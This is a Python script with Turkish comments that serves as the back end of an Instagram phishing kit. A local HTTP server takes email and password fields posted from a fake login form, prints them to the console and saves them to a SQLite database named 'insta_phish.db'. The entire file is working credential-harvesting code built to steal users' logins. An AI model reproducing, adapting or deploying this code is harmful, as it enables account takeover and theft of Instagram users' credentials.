from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os
import sqlite3 as sql
 
  
       

# HTTPRequestHandler sınıfını genişlet ve istekleri işle
class RequestHandler(BaseHTTPRequestHandler):

    veritabani_insta:sql.Connection

    def connect_veritabani(self):
        try:
            self.veritabani_insta = sql.connect("./insta_phish.db")
            print("\n\033[92mVeritabanı bağlantısı başarılı.\033[0m\n")
        except:
            print("\n\033[91mVeritabanı bağlantısında sorun yaşandı.\033[0m\n")

 

        



    def database_save(self,username_deger, password_deger):
        try:
            self.connect_veritabani()
            cur= self.veritabani_insta.cursor()

            
            # Değerleri tabloya ekle
                     
            cur.execute("INSERT INTO Insta_Phishing (username, password) VALUES (?, ?)", (username_deger, password_deger))


            # Değişiklikleri kaydet
            self.veritabani_insta.commit()

            # Bağlantıyı kapat
            cur.close()

        except Exception as e:
            print("Bir hata oluştu:", e)





    def do_POST(self):

        


        # Gelen veriyi al
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Kullanıcı adını ve şifreyi al
        #form = parse_qs(post_data)
        # Veriyi satırlara ayır
      
        lines = post_data.split('\n')

        # Kullanıcı adı ve şifreyi depolamak için boş bir sözlük oluştur
        form_data = {}

        # Veriyi işle
        for line in lines:
            # Eğer satır 'email' içeriyorsa, bu kullanıcı adıdır
            if 'email' in line:
                username = lines[lines.index(line) + 2].strip()  # Kullanıcı adını al
                form_data['email'] = username  # Dictionary'ye ekle
            # Eğer satır 'password' içeriyorsa, bu şifredir
            elif 'password' in line:
                password = lines[lines.index(line) + 2].strip()  # Şifreyi al
                form_data['password'] = password  # Dictionary'ye ekle

        # Kullanıcı adı ve şifreyi ekrana yazdır
        print("Kullanıcı Adı:", form_data['email'])
        print("Şifre:", form_data['password'])


        user= form_data['email']
        passwd =form_data['password']
        self.database_save(user,passwd)
        

        # Başarılı bir yanıt gönder
        self.send_response(200)
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.end_headers()
        #self.wfile.write('Form verileri alındı ve işlendi.'.encode('utf-8'))

        # Tarayıcıda YouTube'u aç
        #webbrowser.open('https://www.instagram.com/accounts/login/')

# Sunucu adresi ve portu
server_address = ('127.0.0.1', 8080)



# HTTP sunucusunu başlat

httpd = HTTPServer(server_address, RequestHandler)
print('Sunucu çalışıyor...')
httpd.serve_forever()
